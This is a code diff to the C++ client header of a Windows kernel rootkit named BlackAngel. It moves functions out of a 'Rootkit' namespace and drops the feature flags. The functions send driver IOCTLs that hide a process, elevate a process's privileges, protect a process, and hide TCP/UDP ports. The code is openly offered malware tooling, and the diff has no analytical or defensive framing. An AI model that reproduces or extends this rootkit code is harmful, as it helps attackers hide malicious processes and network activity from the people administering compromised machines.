@@ -10,12 +10,6 @@
 // Set to FALSE to disable console output
 #define OUTPUT TRUE
 
-// Set to FALSE to disable rootkit features
-#define ROOTKIT TRUE
-
-// Set to FALSE to disable malware support features
-#define MALSUP TRUE
-
 
 namespace BlackAngel
 {
@@ -36,109 +30,97 @@ namespace BlackAngel
 		return TRUE;
 	}
 
-#if ROOTKIT
-	namespace Rootkit
+	struct PidData {
+		UINT32 Pid;
+	};
+
+	struct PortData {
+		USHORT Port;
+	};
+
+	struct HideProtocol {
+		USHORT LTCP;
+		USHORT RTCP;
+		USHORT UDP;
+	};
+
+	VOID HideProcess(UINT32 PID)
 	{
-		struct PidData {
-			UINT32 Pid;
-		};
+		PidData data;
+		data.Pid = PID;
 
-		struct PortData {
-			USHORT Port;
-		};
+		DWORD returned;
+		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
 
-		struct HideProtocol {
-			USHORT LTCP;
-			USHORT RTCP;
-			USHORT UDP;
-		};
-
-		VOID HideProcess(UINT32 PID)
+		if (!success)
 		{
-			PidData data;
-			data.Pid = PID;
-
-			DWORD returned;
-			BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
-
-			if (!success)
-			{
 #if OUTPUT
-				std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
+			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
 #endif
-				return;
-			}
-
-#if OUTPUT
-			std::cout << "[!] Message sent to the driver" << std::endl;
-#endif
+			return;
 		}
 
-		VOID ElevateProcess(UINT32 PID)
-		{
-			PidData data;
-			data.Pid = PID;
-
-			DWORD returned;
-			BOOL success = DeviceIoControl(DriverHandle, IOCTL_ELEVPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
-
-			if (!success)
-			{
 #if OUTPUT
-				std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
+		std::cout << "[!] Message sent to the driver" << std::endl;
 #endif
-				return;
-			}
-
-#if OUTPUT
-			std::cout << "[!] Message sent to driver" << std::endl;
-#endif
-		}
-
-		VOID ProtectProcess(UINT32 PID)
-		{
-			PidData data;
-			data.Pid = PID;
-
-			DWORD returned;
-			BOOL success = DeviceIoControl(DriverHandle, IOCTL_PROTPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
-			if (!success)
-			{
-#if OUTPUT
-				std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
-#endif
-				return;
-			}
-
-#if OUTPUT
-			std::cout << "[!] Message sent to the driver" << std::endl;
-#endif
-		}
-
-		VOID HidePort(HideProtocol hp)
-		{
-			DWORD returned;
-			BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPORT, &hp, sizeof(hp), nullptr, 0, &returned, nullptr);
-			if (!success)
-			{
-#if OUTPUT
-				std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
-#endif
-				return;
-			}
-
-#if OUTPUT
-			std::cout << "[!] Message sent to the driver" << std::endl;
-#endif
-		}
 	}
-#endif
 
-#if MALSUP
-	namespace MalSup
+	VOID ElevateProcess(UINT32 PID)
 	{
+		PidData data;
+		data.Pid = PID;
 
-	}
+		DWORD returned;
+		BOOL success = DeviceIoControl(DriverHandle, IOCTL_ELEVPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
+
+		if (!success)
+		{
+#if OUTPUT
+			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
 #endif
+			return;
+		}
+
+#if OUTPUT
+		std::cout << "[!] Message sent to driver" << std::endl;
+#endif
+	}
+
+	VOID ProtectProcess(UINT32 PID)
+	{
+		PidData data;
+		data.Pid = PID;
+
+		DWORD returned;
+		BOOL success = DeviceIoControl(DriverHandle, IOCTL_PROTPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
+		if (!success)
+		{
+#if OUTPUT
+			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
+#endif
+			return;
+		}
+
+#if OUTPUT
+		std::cout << "[!] Message sent to the driver" << std::endl;
+#endif
+	}
+
+	VOID HidePort(HideProtocol hp)
+	{
+		DWORD returned;
+		BOOL success = DeviceIoControl(DriverHandle, IOCTL_HIDEPORT, &hp, sizeof(hp), nullptr, 0, &returned, nullptr);
+		if (!success)
+		{
+#if OUTPUT
+			std::cout << "[-] Failed to send message to the driver. Error : " << GetLastError() << std::endl;
+#endif
+			return;
+		}
+
+#if OUTPUT
+		std::cout << "[!] Message sent to the driver" << std::endl;
+#endif
+	}
 
 }
